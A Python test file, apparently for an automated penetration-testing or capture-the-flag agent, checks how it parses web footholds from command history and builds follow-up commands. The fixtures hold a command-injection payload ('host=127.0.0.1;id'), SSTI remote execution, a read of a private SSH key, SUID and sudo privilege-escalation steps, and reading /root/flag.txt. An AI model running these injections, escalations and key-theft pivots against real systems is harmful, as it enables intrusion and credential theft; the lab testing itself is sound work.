from grin.closer import closer_commands, extract_web_foothold


def test_extract_foothold_from_web_rce_command():
    h = "web-rce --url http://172.30.0.15/ --param name --method POST --mode ssti --cmd 'id'"
    fh = extract_web_foothold(h, "172.30.0.15")
    assert fh["url"] == "http://172.30.0.15/"
    assert fh["param"] == "name"
    assert fh["method"] == "POST"
    assert fh["mode"] == "ssti"


def test_extract_foothold_from_curl_query():
    h = "curl 'http://172.30.0.12/ping?host=127.0.0.1;id' -> uid=33(www-data)"
    fh = extract_web_foothold(h, "172.30.0.12")
    assert fh["param"] == "host"
    assert "172.30.0.12" in fh["url"]
    assert fh["mode"] == "cmdi"


def test_extract_foothold_none_without_web_signal():
    assert extract_web_foothold("nmap -sV 10.0.0.5\nssh failed", "10.0.0.5") is None


def test_closer_commands_for_web_foothold_try_both_privesc():
    h = "web-rce --url http://172.30.0.15/ --param name --mode ssti --cmd 'id' -> uid=1000(appsvc)"
    cmds = closer_commands(h, "172.30.0.15")
    joined = "\n".join(cmds)
    assert "suid-hijack" in joined          # SUID PATH-hijack closer
    assert "sudo-gtfo" in joined            # sudo-NOPASSWD closer
    assert "web-rce" in joined and "cat /root/flag.txt" in joined  # direct read attempt
    assert all("172.30.0.15" in c for c in cmds)
    assert all("--param name" in c for c in cmds)


def test_closer_commands_ssh_pivot_when_key_and_host():
    h = ("cat /opt/deploy/id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n"
         "deploy key for the analyst service account\n"
         "Nmap scan report for 172.30.0.17\n22/tcp open ssh")
    cmds = closer_commands(h, "172.30.0.16")
    joined = "\n".join(cmds)
    assert "ssh-loot" in joined
    assert "172.30.0.17" in joined          # the discovered pivot host, not the entry host
    assert "/tmp/loot/id_rsa" in joined


def test_closer_commands_empty_when_no_foothold():
    assert closer_commands("nmap only, nothing found", "10.0.0.5") == []
